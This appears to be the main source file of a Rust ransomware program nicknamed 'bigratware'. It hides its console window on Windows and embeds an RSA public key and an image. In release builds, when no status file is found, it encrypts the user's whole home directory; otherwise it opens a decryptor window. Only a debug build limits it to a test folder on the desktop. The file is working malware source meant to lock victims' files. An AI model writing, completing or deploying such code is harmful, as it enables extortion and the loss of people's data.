#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod encryptor;
mod decryptor;
#[cfg(windows)]
mod decryptor_gui;
mod startup;

use std::fs;
use rsa::pkcs8::DecodePublicKey;
use rsa::RsaPublicKey;
use anyhow::Result;
use ::decryptor::helpers::gen_new_path;
use crate::decryptor::{get_status_data, StatusReadError};
use crate::encryptor::encrypt_everything;

#[cfg(windows)]
use crate::decryptor_gui::start_decryptor_gui;

const BIGRAT_PNG: &[u8; 1044942] = include_bytes!("../../bigrat.png");
const PUBLIC_KEY: &[u8; 294] = include_bytes!("../../public-key.der");

fn main() -> Result<()> {
    let pub_key = RsaPublicKey::from_public_key_der(PUBLIC_KEY)?;
    let mut rng = rand::thread_rng();

    #[cfg(debug_assertions)]
    let working_path = dirs_next::desktop_dir()
        .unwrap_or(dirs_next::home_dir().unwrap())
        .join("bigratware-testground");
    #[cfg(not(debug_assertions))]
    let working_path = dirs_next::home_dir().unwrap();

    match get_status_data(&working_path) {
        Ok(data) => {
            #[cfg(windows)]
            start_decryptor_gui(data, working_path)?;
            #[cfg(not(windows))]
            {
                dbg!(data);
                todo!("Non-Windows decryptor UI")
            }
        }
        Err(err) => {
            match err {
                StatusReadError::IoError(e) => Err(e)?,
                StatusReadError::DoesNotExist => {
                    encrypt_everything(&working_path, &pub_key, &mut rng)?;
                }
                StatusReadError::Invalid(err_text) => {
                    eprintln!("Invalid status file: {}", err_text);
                    let status_path = working_path.join(".bigrat-status");
                    fs::rename(
                        &status_path,
                        gen_new_path(status_path.clone(), true)?
                    )?;
                    encrypt_everything(&working_path, &pub_key, &mut rng)?;
                }
            }
        }
    }

    Ok(())
}
